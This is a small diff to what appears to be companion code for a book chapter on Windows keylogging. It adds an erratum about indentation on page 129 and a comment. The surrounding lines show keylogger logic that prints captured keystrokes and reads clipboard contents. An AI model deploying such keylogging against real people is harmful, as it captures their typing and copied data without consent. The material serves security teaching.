@@ -2,6 +2,9 @@
 '''
 Keylogging for Fun and Keystrokes (Windows)
 Page 128
+
+Note: typo on page 129: code block on the top half of the page shows 8 spaces indent,
+should be 4 spaces (to continue get_current_process method)
 '''
 
 from ctypes import byref, create_string_buffer, c_ulong, windll
@@ -49,6 +52,7 @@ class KeyLogger:
         if 32 < event.Ascii < 127:
             print(chr(event.Ascii), end='')
         else:
+            ''' Non-alpha, such as CTRL, ALT, ESC, etc. '''
             if event.Key == 'V':
                 win32clipboard.OpenClipboard()
                 value = win32clipboard.GetClipboardData()
